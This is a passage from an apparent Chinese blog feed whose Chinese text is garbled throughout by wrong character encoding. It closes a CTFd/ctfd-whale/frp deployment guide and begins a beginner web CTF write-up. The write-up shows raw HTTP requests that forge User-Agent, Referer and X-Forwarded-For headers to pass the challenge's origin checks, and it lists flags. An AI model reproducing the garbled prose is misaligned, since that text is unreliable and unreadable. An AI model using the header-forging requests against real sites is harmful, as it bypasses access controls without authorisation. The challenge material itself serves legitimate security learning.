loading="lazy"><p>æ˜¾ç¤ºctfd_frp-containers</p><p>è¿è¡Œ<code>docker network inspect ctfd_frp</code></p><img src="/article/CTFD/20201017234428683.png" class="" title="ctfd_frp" loading="lazy"><p>è¿™ä¸ªæ˜¯docker-composeé‡Œcomposeååˆ›å»ºçš„ç½‘ç»œï¼Œæˆ‘ä»¬å°†frpsåŠ å…¥æ­¤ç½‘ç»œï¼Œä¾‹å¦‚æˆ‘çš„frpå®¹å™¨idä¸º12345ï¼Œåˆ™è¿è¡Œ<code>docker network connect ctfd_frp 12345&lt;å³frpå®¹å™¨id&gt;</code>ã€‚å†è¿è¡Œ<code>docker network inspect ctfd_frp</code>ï¼Œå¦‚ä¸‹<img src="/article/CTFD/20201017234344822.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"></p><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°ipä¸æˆ‘ä»¬ä¹‹å‰è®¾ç½®çš„ç›¸åº”ã€‚</p><p>æ­¤æ—¶è¿è¡Œ<code>docker restart ctfd_frpc_1 frp_frps_1</code></p><p>ç„¶å<code>docker ps</code></p><p>æœ€ç»ˆå¦‚ä¸‹<img src="/article/CTFD/20201017234457228.png" class="" title="ps" loading="lazy"></p><p>æˆåŠŸå®Œæˆã€‚</p><p>æœ€åè®¾ç½®é“é¢˜ç›®é€‰æ‹©ï¼ˆæˆ‘åšäº†æ±‰åŒ–ï¼‰</p><img src="/article/CTFD/20201017233701655.png" class="" title="é¢˜ç›®1" loading="lazy"><img src="/article/CTFD/20201017233922648.png" class="" title="é¢˜ç›®2" loading="lazy"><img src="/article/CTFD/20201017234241273.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"><p><code>docker ps</code>é‡Œå¯ä»¥çœ‹åˆ°å®¹å™¨æˆåŠŸå¯åŠ¨ï¼Œåœ°å€æ­£å¸¸è®¿é—®</p><h3 id="å‘ç‚¹æ³¨æ„"><a href="#å‘ç‚¹æ³¨æ„" class="headerlink" title="å‘ç‚¹æ³¨æ„"></a>å‘ç‚¹æ³¨æ„</h3><ol><li>å¦‚æœfrpcé‡å¤å‡ºç°retryingï¼Œè¯·è¿”å›æ£€æŸ¥docker-compose.ymlã€‚æ‰¾åˆ°frpcè®¾ç½®ï¼Œæ£€æŸ¥ipè®¾ç½®æ˜¯å¦æ­£ç¡®ã€‚å†æ£€æŸ¥ctfdçš„Admin Panelé‡Œctfd-whaleè®¾ç½®æ˜¯å¦æ­£ç¡®ã€‚</li><li>å¦‚æœå‡ºç°å®‰è£…æŸä¸ªæ–‡ä»¶å¤±è´¥é—®é¢˜ï¼Œè¯·æ›´æ¢æºï¼Œå¾ˆå¤šéƒ½æ˜¯æºé‡Œæ²¡æœ‰æŒ‡å®šæ–‡ä»¶é€ æˆçš„ã€‚å¯ä»¥è‡ªè¡Œè®¿é—®ä¸€ä¸‹ç½‘ç«™ï¼ŒæŸ¥çœ‹ä¸€ä¸‹è¦ä¸‹è½½çš„æ–‡ä»¶åï¼Œå†è¿›è¡Œé…ç½®ã€‚</li><li>ä¼¼ä¹dockerå’Œç³»ç»Ÿçš„ç‰ˆæœ¬ä¼šæœ‰å½±å“ï¼Œæœ¬æœºä¸ºCentOS7.4 64ä½ï¼Œè…¾è®¯äº‘ï¼Œdockeré…ç½®å¦‚ä¸‹</li></ol><img src="/article/CTFD/20201017234315447.png" class="" title="ç‰ˆæœ¬" loading="lazy"><ol start="4"><li><p>pythonçš„é—®é¢˜ï¼Œä¸Šé¢æåˆ°çš„ï¼Œå¯ä»¥åˆ é™¤ï¼Œæ˜¯å› ä¸ºæ²¡æœ‰æŒ‡å®šç‰ˆæœ¬çš„åŸå› ï¼Œä¹Ÿå¯ä»¥æŒ‡å®šç‰ˆæœ¬å†ä¸‹è½½</p></li><li><p>ctfdè¿è¡Œ<code>docker-compose up -d</code>åæœ‰å¯èƒ½æç¤ºdocker-entrypoint.shæ²¡æœ‰æƒé™ï¼Œæ‰‹åŠ¨åŠ ä¸ªæƒé™å³å¯ã€‚åœ¨CTFdæ–‡ä»¶å¤¹ä¸‹è¿è¡Œ<code>chmod a+x docker-entrypoint.sh</code>ï¼ˆdocker-compose.ymlé‡Œå…¶å®å†™äº†åŠ æƒé™ï¼Œä½†æ˜¯æœ€åå¹¶æ²¡æœ‰åŠ ä¸Šå»ï¼Ÿï¼‰</p></li><li><p>å¦‚æœdockerå®¹å™¨æ— æ³•å¯åŠ¨æˆ–è€…frpç«¯å£æ— æ³•æ˜ å°„å¯ä»¥è¿›å®¹å™¨æ£€æŸ¥ </p><p>ç¡®ä¿docker apiå¡«å†™æ­£ç¡®ï¼Œå¦‚docker-compose.ymlä¸­å†™çš„unix:///var/run/docker.sock<br>ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ç«¯å£å½¢å¼çš„apiå¦‚<a href="https://success.docker.com/article/how-do-i-enable-the-remote-api-for-dockerd">å®˜æ–¹ç¤ºä¾‹</a>ï¼šå¯ä»¥ç”¨IPï¼šç«¯å£æŒ‡å®šAPI</p><h6 id="dockerå®¹å™¨æ— æ³•å¯åŠ¨é—®é¢˜"><a href="#dockerå®¹å™¨æ— æ³•å¯åŠ¨é—®é¢˜" class="headerlink" title="dockerå®¹å™¨æ— æ³•å¯åŠ¨é—®é¢˜"></a>dockerå®¹å™¨æ— æ³•å¯åŠ¨é—®é¢˜</h6><p>è¿›å…¥å®¹å™¨æ£€æŸ¥ï¼š</p><pre class="language-none"><code class="language-none">docker exec -it &lt;ctfdå®¹å™¨id&gt; sh&#x2F;opt&#x2F;CTFd# python&gt;&gt;&gt;import docker&gt;&gt;&gt;client&#x3D;docker.DockerClient(base_url&#x3D;&quot;unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;docker.sock&quot;)&gt;&gt;&gt;client.images.list()</code></pre><p> å¦‚æœapiæ­£ç¡®ä¼šåˆ—å‡ºæ‰€æœ‰é•œåƒ </p><h6 id="frpç«¯å£æ— æ³•æ˜ å°„é—®é¢˜"><a href="#frpç«¯å£æ— æ³•æ˜ å°„é—®é¢˜" class="headerlink" title="frpç«¯å£æ— æ³•æ˜ å°„é—®é¢˜"></a>frpç«¯å£æ— æ³•æ˜ å°„é—®é¢˜</h6><p>è¿›å…¥å®¹å™¨æ£€æŸ¥ï¼š</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;å…¶å®æ£€æŸ¥å¯ä»¥é¡ºä¾¿æ£€æŸ¥ä¸€ä¸‹ä¸Šé¢çš„ï¼Œå› ä¸ºéƒ½åœ¨ctfdå®¹å™¨å†…docker exec -it &lt;ctfdå®¹å™¨id&gt; sh&#x2F;opt&#x2F;CTFd# python&gt;&gt;&gt;import requests&gt;&gt;&gt;requests.get(&quot;http:&#x2F;&#x2F;172.1.0.3:7400&#x2F;api&#x2F;reload&quot;)&#x2F;&#x2F;å³frp apiçš„åœ°å€è¿”å›&lt;Response [200]&gt; #è¡¨ç¤ºæˆåŠŸ</code></pre><p>å¦‚æœfrpcè¿˜æ˜¯å‡ºç°å¦‚ä¸‹é—®é¢˜</p><pre class="language-none"><code class="language-none">requests.exceptions.ConnectionError: HTTPConnectionPool(host&#x3D;&#39;172.1.0.3&#39;, port&#x3D;7400): Max retries exceeded with url: &#x2F;api&#x2F;reload (Caused by NewConnectionError(&#39;&lt;urllib3.connection.HTTPConnection object at 0x7f8df919f850&gt;: Failed to establish a new connection: [Errno 111] Connection refused&#39;))</code></pre><p>åˆ™é‡æ–°é…ç½®frpcã€‚ç¼–è¾‘/CTFd/frpc/frpc.ini</p><pre class="language-none"><code class="language-none">[common]token &#x3D; randommeserver_addr &#x3D; 172.1.0.4server_port &#x3D; 6490pool_count &#x3D; 200tls_enable &#x3D; trueadmin_addr &#x3D; 172.1.0.3 #è¿™é‡Œåƒä¸‡åƒä¸‡åˆ«å¿˜åŠ ï¼Œä¹‹å‰è¦è¢«ææ°”æ­»admin_port &#x3D; 7400</code></pre><p>ç„¶åè¿è¡Œ<code>docker restart ctfd_frpc_1</code>ï¼ˆè¿™é‡Œå†çœ‹frpc.iniä¼šå‘ç°å†…å®¹æ›´æ–°äº†ï¼Œadminé…ç½®æ²¡äº†ï¼Œä¸ç”¨æ‹…å¿ƒï¼‰</p><p>å†è¿›å®¹å™¨æ£€æŸ¥<code>requests.get(&quot;http://172.1.0.3:7400/api/reload&quot;)</code>åº”è¯¥å°±å¯ä»¥äº†<code>&lt;Response [200]&gt;</code></p></li></ol><ol start="7"><li><p>é‡äº‹ä¸å†³è¯·é‡å¯</p></li><li><p>å¦‚æœå‘ç°frpç«¯å£å†²çªï¼Œè¯·æ£€æŸ¥æœ¬åœ°frpcæˆ–è€…frpsæœåŠ¡ï¼Œfrpæ˜¯åœ¨dockerä¸Š<strong>ä¸æ˜¯åœ¨æœ¬åœ°</strong>çš„ï¼</p><pre class="language-none"><code class="language-none">systemctl stop frpcsystemctl stop frps</code></pre></li></ol><ol start="9"><li><p>æ´»ç”¨æŸ¥çœ‹log</p><pre class="language-none"><code class="language-none">docker logs &lt;ctfdå®¹å™¨id&gt;docker logs &lt;frpå®¹å™¨id&gt;</code></pre></li><li><p>å¦‚æœä¿®æ”¹äº†ä»»æ„é…ç½®ï¼Œè¯·è·Ÿç€ä¿®æ”¹<strong>ç³»åˆ—é…ç½®</strong>ï¼Œå¾ˆå¤šå°±æ˜¯å› ä¸ºæ¼æ”¹é€ æˆçš„</p></li></ol><p>11.docker psæ˜¾ç¤ºæ­£å¸¸ä½†æ˜¯æ— æ³•è®¿é—®</p><p> å¯ä»¥ä½¿ç”¨ <code>docker logs ctfd_ctfd_1</code> æŸ¥çœ‹è¾“å‡ºï¼Œå¦‚æœå‘ç°è¾“å‡ºç±»ä¼¼ï¼š </p><pre class="language-none"><code class="language-none">&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;site-packages&#x2F;tzlocal&#x2F;unix.py:158: UserWarning: Can not find any timezone configuration, defaulting to UTC.  warnings.warn(&#39;Can not find any timezone configuration, defaulting to UTC.&#39;)Starting CTFd&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;importlib&#x2F;_bootstrap.py:219: RuntimeWarning: greenlet.greenlet size changed, may indicate binary incompatibility. Expected 144 from C header, got 152 from PyObject  return f(*args, **kwds)&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;importlib&#x2F;_bootstrap.py:219: RuntimeWarning: greenlet.greenlet size changed, may indicate binary incompatibility. Expected 144 from C header, got 152 from PyObject  return f(*args, **kwds)&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;importlib&#x2F;_bootstrap.py:219: RuntimeWarning: greenlet.greenlet size changed, may indicate binary incompatibility. Expected 144 from C header, got 152 from PyObject  return f(*args, **kwds)[2020-10-11 12:31:30 +0000] [1] [INFO] Starting gunicorn 19.9.0[2020-10-11 12:31:30 +0000] [1] [INFO] Listening at: http:&#x2F;&#x2F;0.0.0.0:8000 (1)[2020-10-11 12:31:30 +0000] [1] [INFO] Using worker: gevent[2020-10-11 12:31:30 +0000] [21] [INFO] Booting worker with pid: 21[2020-10-11 12:31:31 +0000] [23] [INFO] Booting worker with pid: 23[2020-10-11 12:31:32 +0000] [25] [INFO] Booting worker with pid: 25[2020-10-11 12:31:34 +0000] [27] [INFO] Booting worker with pid: 27[2020-10-11 12:31:35 +0000] [29] [INFO] Booting worker with pid: 29[2020-10-11 12:31:36 +0000] [31] [INFO] Booting worker with pid: 31[2020-10-11 12:31:37 +0000] [33] [INFO] Booting worker with pid: 33[2020-10-11 12:31:39 +0000] [35] [INFO] Booting worker with pid: 35[2020-10-11 12:31:40 +0000] [37] [INFO] Booting worker with pid: 37(ä¸€ç›´åœ¨åŠ )</code></pre><p> åˆ™é—®é¢˜ä¸º<a href="https://stackoverflow.com/questions/64105616/greenlet-runtime-error-and-deployed-app-in-docker-keeps-booting-all-the-workers">è¿™ç¯‡æ–‡ç« ä¸­æ‰€æåˆ°çš„é—®é¢˜</a>ï¼Œåªéœ€è¦åˆ é™¤ <code>requirements.txt</code> ä¸­çš„ <code>gevent</code> ç‰ˆæœ¬å·å³å¯ï¼Œç»“æœç±»ä¼¼ä¸‹é¢è¿™æ · </p><pre class="language-none"><code class="language-none">&#x2F;requirements.txt...redis&#x3D;&#x3D;3.3.11datafreeze&#x3D;&#x3D;0.1.0geventpython-dotenv&#x3D;&#x3D;0.10.3flask-restplus&#x3D;&#x3D;0.13.0...</code></pre><p> ç„¶å <code>docker-compose down</code> å†å¯åŠ¨ <code>docker-compose up -d --build</code> ä¸å‡ºæ„å¤–åº”è¯¥å°±èƒ½è§£å†³é—®é¢˜ </p><p>(æ›´æ–°)12.å‡ºç°å¦‚ä¸‹é—®é¢˜å¯å‚è€ƒ<a href="https://github.com/glzjin/CTFd-Whale/issues/20">æ­¤issue</a>æå‡ºçš„é—®é¢˜ï¼Œåœ¨ctfdçš„docker-compose.ymlæ·»åŠ <code>/var/run/docker.sock:/var/run/docker.sock</code></p><img src="/article/CTFD/99216164-ee25b080-280f-11eb-95a9-2c2a17895068.png" class="" title="image" loading="lazy"><p>å¦‚ä¸‹</p><img src="/article/CTFD/image-20210225153426310.png" class="" title="image-20210225153426310" loading="lazy"><h2 id="2021-2-25-æ›´æ–°"><a href="#2021-2-25-æ›´æ–°" class="headerlink" title="2021.2.25 æ›´æ–°"></a>2021.2.25 æ›´æ–°</h2><p>æœ€æ–°çš„CTFdæ”¹äº†éƒ¨åˆ†ä»£ç ï¼Œç”±äºå…¼å®¹æ€§é—®é¢˜ï¼Œéœ€è¦é‡æ–°ç¼–è¾‘ä¸€äº›ä¸œè¥¿ï¼Œä¾‹å¦‚<code>Dockerfile</code></p><pre class="language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM python:3.7-slim-busterWORKDIR &#x2F;opt&#x2F;CTFdRUN mkdir -p &#x2F;opt&#x2F;CTFd &#x2F;var&#x2F;log&#x2F;CTFd &#x2F;var&#x2F;uploads# hadolint ignore&#x3D;DL3008RUN echo &#39;deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster main non-free contrib \ deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-updates main non-free contrib \ deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-backports main non-free contrib \ deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster main non-free contrib \ deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-updates main non-free contrib \ deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-backports main non-free contrib \ deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian-security&#x2F; buster&#x2F;updates main non-free contrib \ deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian-security&#x2F; buster&#x2F;updates main non-free contrib&#39;&gt; &#x2F;etc&#x2F;apt&#x2F;sources.list &amp;&amp; \    apt-get update \    &amp;&amp; apt-get install -y --no-install-recommends \        build-essential \        default-mysql-client \        python3-dev \        libffi-dev \        libssl-dev \        git \    &amp;&amp; apt-get clean \    &amp;&amp; rm -rf &#x2F;var&#x2F;lib&#x2F;apt&#x2F;lists&#x2F;*COPY requirements.txt &#x2F;opt&#x2F;CTFd&#x2F;RUN pip install -r requirements.txt -i http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pypi&#x2F;simple&#x2F; --no-cache-dirCOPY . &#x2F;opt&#x2F;CTFd# hadolint ignore&#x3D;SC2086RUN for d in CTFd&#x2F;plugins&#x2F;*; do \        if [ -f &quot;$d&#x2F;requirements.txt&quot; ]; then \            pip install -r $d&#x2F;requirements.txt -i http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pypi&#x2F;simple&#x2F; --no-cache-dir; \        fi; \    done;RUN adduser \    --disabled-login \    -u 1001 \    --gecos &quot;&quot; \    --shell &#x2F;bin&#x2F;bash \    ctfdRUN chmod +x &#x2F;opt&#x2F;CTFd&#x2F;docker-entrypoint.sh \    &amp;&amp; chown -R 1001:1001 &#x2F;opt&#x2F;CTFd &#x2F;var&#x2F;log&#x2F;CTFd &#x2F;var&#x2F;uploadsUSER 1001EXPOSE 8000ENTRYPOINT [&quot;&#x2F;opt&#x2F;CTFd&#x2F;docker-entrypoint.sh&quot;]</code></pre><p>å…¶ä»–pipæº</p><pre class="language-none"><code class="language-none">æ¸…åï¼šhttps:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple&#x2F;ä¸­å›½ç§‘æŠ€å¤§å­¦ https:&#x2F;&#x2F;pypi.mirrors.ustc.edu.cn&#x2F;simple&#x2F;åä¸­ç†å·¥å¤§å­¦ï¼šhttp:&#x2F;&#x2F;pypi.hustunique.com&#x2F;å±±ä¸œç†å·¥å¤§å­¦ï¼šhttp:&#x2F;&#x2F;pypi.sdutlinux.org&#x2F;è±†ç“£ï¼šhttp:&#x2F;&#x2F;pypi.douban.com&#x2F;simple&#x2F;</code></pre><img src="/article/CTFD/image-20210225163134408.png" class="" title="image-20210225163134408" loading="lazy"><img src="/article/CTFD/image-20210225163821673.png" class="" title="image-20210225163821673" loading="lazy"><p><strong>æˆ‘æ•´åˆäº†ä¸€ä¸‹CTFd+ctfd-whale+frpc+frpsï¼Œå¯ä»¥å‚è€ƒä¸€ä¸‹ï¼Œ<a href="https://github.com/Err0rCM/CTFd_with_CTFd-whale">å·²ä¸Šä¼ github</a></strong></p><h3 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h3><p> <a href="https://www.zhaoj.in/read-6333.html">CTFd-Whale æ¨èéƒ¨ç½²å®è·µ</a>(èµµå¸ˆå‚…å®˜æ–¹)</p><p><a href="https://blog.csdn.net/fjh1997/article/details/100850756/">æ‰‹æŠŠæ‰‹æ•™ä½ å¦‚ä½•å»ºç«‹ä¸€ä¸ªæ”¯æŒctfåŠ¨æ€ç‹¬ç«‹é¶æœºçš„é¶åœºï¼ˆctfd+ctfd-whaleï¼‰</a></p><p> <a href="https://vaala.cat/2020/09/21/ctfd%E4%BD%BF%E7%94%A8ctfd-whale%E5%8A%A8%E6%80%81%E9%9D%B6%E6%9C%BA%E6%8F%92%E4%BB%B6%E6%90%AD%E5%BB%BA%E9%9D%B6%E5%9C%BA%E6%8C%87%E5%8D%97/">ctfdä½¿ç”¨ctfd-whaleåŠ¨æ€é¶æœºæ’ä»¶æ­å»ºé¶åœºæŒ‡å—</a></p><p>è½¬è½½è¯·æ³¨æ˜æ¥æºï¼š<a href="https://err0r.top/article/CTFD/">https://err0r.top/article/CTFD/</a></p><p>å¦‚æœæœ‰é—®é¢˜è¯·ç§ä¿¡è”ç³»æˆ‘ï¼Œä¸è¶³ä¹‹å¤„æ•¬è¯·è°…è§£</p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆç¬”è®° </category>
          
          <category> èœé¸¡æ•™ç¨‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0XGame WEB Write-up</title>
      <link href="article/0XGame-WEB-Write-up/"/>
      <url>article/0XGame-WEB-Write-up/</url>
      
        <content type="html"><![CDATA[<p>by:gyy</p><h2 id="robotsåè®®"><a href="#robotsåè®®" class="headerlink" title="robotsåè®®"></a>robotsåè®®</h2><h3 id="è€ƒå¯Ÿrobotsåè®®"><a href="#è€ƒå¯Ÿrobotsåè®®" class="headerlink" title="è€ƒå¯Ÿrobotsåè®®"></a>è€ƒå¯Ÿrobotsåè®®</h3><h4 id="é¢˜ç›®åœ°å€ï¼šhttp-web-game-0xctf-com-30051"><a href="#é¢˜ç›®åœ°å€ï¼šhttp-web-game-0xctf-com-30051" class="headerlink" title="é¢˜ç›®åœ°å€ï¼šhttp://web.game.0xctf.com:30051/"></a>é¢˜ç›®åœ°å€ï¼š<a href="http://web.game.0xctf.com:30051/">http://web.game.0xctf.com:30051/</a></h4><p>çŸ¥è¯†é“¾æ¥ï¼š</p><p>robotsæ˜¯ç½‘ç«™è·Ÿçˆ¬è™«é—´çš„åè®®ï¼Œç”¨ç®€å•ç›´æ¥çš„txtæ ¼å¼æ–‡æœ¬æ–¹å¼å‘Šè¯‰å¯¹åº”çš„çˆ¬è™«è¢«å…è®¸çš„æƒé™ï¼Œä¹Ÿå°±æ˜¯è¯´robots.txtæ˜¯æœç´¢å¼•æ“ä¸­è®¿é—®ç½‘ç«™çš„æ—¶å€™è¦æŸ¥çœ‹çš„ç¬¬ä¸€ä¸ªæ–‡ä»¶ã€‚å½“ä¸€ä¸ªæœç´¢èœ˜è››è®¿é—®ä¸€ä¸ªç«™ç‚¹æ—¶ï¼Œå®ƒä¼šé¦–å…ˆæ£€æŸ¥è¯¥ç«™ç‚¹æ ¹ç›®å½•ä¸‹æ˜¯å¦å­˜åœ¨robots.txtï¼Œå¦‚æœå­˜åœ¨ï¼Œæœç´¢æœºå™¨äººå°±ä¼šæŒ‰ç…§è¯¥æ–‡ä»¶ä¸­çš„å†…å®¹æ¥ç¡®å®šè®¿é—®çš„èŒƒå›´ï¼›å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œæ‰€æœ‰çš„æœç´¢èœ˜è››å°†èƒ½å¤Ÿè®¿é—®ç½‘ç«™ä¸Šæ‰€æœ‰æ²¡æœ‰è¢«å£ä»¤ä¿æŠ¤çš„é¡µé¢ã€‚</p><p>ç›´æ¥è®¿é—®./robots.php</p><pre class="language-none"><code class="language-none">User-agent: *Allow: &#x2F;User-agent: CTFerDisallow: &#x2F;flaaaggg.php</code></pre><h3 id="æœ€ç»ˆ"><a href="#æœ€ç»ˆ" class="headerlink" title="æœ€ç»ˆ"></a>æœ€ç»ˆ</h3><p>è®¿é—®/flaaaggg.phpå³å¯</p><p>é—®é¢˜è§£å†³ï¼š0xGame{now_you_k0nw_robots_Protocol}</p><h2 id="view-source"><a href="#view-source" class="headerlink" title="view_source"></a>view_source</h2><p>è€ƒå¯Ÿä¼šä¸ä¼šçœ‹æºç </p><h3 id="æœ€ç»ˆ-1"><a href="#æœ€ç»ˆ-1" class="headerlink" title="æœ€ç»ˆ"></a>æœ€ç»ˆ</h3><p>f12çœ‹æºç å°±è¡Œ</p><p>é—®é¢˜è§£å†³ï¼š0xGame{web_sign_in}</p><h2 id="get-amp-post"><a href="#get-amp-post" class="headerlink" title="get&amp;post"></a>get&amp;post</h2><h3 id="è€ƒå¯Ÿgetä¸postçš„åº”ç”¨"><a href="#è€ƒå¯Ÿgetä¸postçš„åº”ç”¨" class="headerlink" title="è€ƒå¯Ÿgetä¸postçš„åº”ç”¨"></a>è€ƒå¯Ÿgetä¸postçš„åº”ç”¨</h3><p>æ‰“å¼€ç›´æ¥ç»™ä»£ç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'0xGame'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'X1cT34m'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'0xGame'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'X1cT34m'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'acd666tql'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">===</span> <span class="token variable">$c</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$b</span> <span class="token operator">===</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Do you konw GET &amp; POST ?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>ä»£ç å®¡è®¡ï¼Œgetä¼ å‚ï¼Œpostä¼ å‚å³å¯</p><h3 id="æœ€ç»ˆ-2"><a href="#æœ€ç»ˆ-2" class="headerlink" title="æœ€ç»ˆ"></a>æœ€ç»ˆ</h3><p>payloadï¼š<code>./?0xGame=acd666tql</code><br>post:<code>X1cT34m=acd666tql</code></p><p>é—®é¢˜è§£å†³ï¼š0xGame{Get_4nd_P0sT_1s_eA5y}</p><h2 id="wh1sperâ€™s-secret-garden"><a href="#wh1sperâ€™s-secret-garden" class="headerlink" title="wh1sperâ€™s_secret_garden"></a>wh1sperâ€™s_secret_garden</h2><h3 id="è€ƒå¯Ÿhttpåè®®"><a href="#è€ƒå¯Ÿhttpåè®®" class="headerlink" title="è€ƒå¯Ÿhttpåè®®"></a>è€ƒå¯Ÿhttpåè®®</h3><h4 id="é¢˜ç›®åœ°å€ï¼šhttp-web-game-0xctf-com-30050"><a href="#é¢˜ç›®åœ°å€ï¼šhttp-web-game-0xctf-com-30050" class="headerlink" title="é¢˜ç›®åœ°å€ï¼šhttp://web.game.0xctf.com:30050/"></a>é¢˜ç›®åœ°å€ï¼š<a href="http://web.game.0xctf.com:30050/">http://web.game.0xctf.com:30050/</a></h4><p>æ‰“å¼€å‘ç°ï¼š</p><pre class="language-none"><code class="language-none">ä½ éœ€è¦ä½¿ç”¨wh1speræµè§ˆå™¨æ¥è®¿é—®ä»€ä¹ˆï¼Ÿæ²¡æœ‰ï¼Ÿæ²¡æœ‰wh1speræµè§ˆå™¨è¿˜æƒ³æ‰“webï¼Ÿ</code></pre><p>æŠ“åŒ…æ”¹åŒ…,æµè§ˆå™¨æ”¹æˆwh1sper</p><pre class="language-none"><code class="language-none">GET &#x2F; HTTP&#x2F;1.1Host: web.game.0xctf.com:30050Cache-Control: max-age&#x3D;0Upgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) wh1sper&#x2F;84.0.4147.135 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Connection: close</code></pre><p>ç„¶åå‘ç°</p><pre class="language-none"><code class="language-none">ä½ éœ€è¦æ¥è‡ªï¼šhttps:&#x2F;&#x2F;ctf.njupt.edu.cn&#x2F;</code></pre><p>ä¼ªé€ åœ°å€ä¸‰ç§æ–¹å¼ï¼š</p><pre class="language-none"><code class="language-none">Client-Ip: 127.0.0.1X-Forwarded-For: 127.0.0.1Host: 127.0.0.1Referer: 127.0.0.1</code></pre><p>è¿™é‡Œ<code>Referer: https://ctf.njupt.edu.cn/</code></p><p>å†å‘åŒ…ï¼Œå‘ç°</p><pre><code>ä½ å¾—ä»æœ¬åœ°è®¿é—®æ‰è¡Œå“Ÿï¼</code></pre><p>æ”¹åŒ…ï¼ŒåŠ ä¸Š<code>X-Forwarded-For: 127.0.0.1</code></p><h3 id="æœ€ç»ˆ-3"><a href="#æœ€ç»ˆ-3" class="headerlink" title="æœ€ç»ˆ"></a>æœ€ç»ˆ</h3><p>å‘åŒ…ï¼š</p><pre class="language-none"><code class="language-none">GET &#x2F; HTTP&#x2F;1.1Host: web.game.0xctf.com:30050Cache-Control: max-age&#x3D;0Upgrade-Insecure-Requests: 1Referer: https:&#x2F;&#x2F;ctf.njupt.edu.cn&#x2F;X-Forwarded-For: 127.0.0.1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) wh1sper&#x2F;84.0.4147.135 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Connection: close</code></pre><p>é—®é¢˜è§£å†³ï¼š0xGame{å®å°±æ˜¯æ¥å¤´éœ¸ç‹?}</p><h2 id="readflag"><a href="#readflag" class="headerlink" title="readflag"></a>readflag</h2><h3 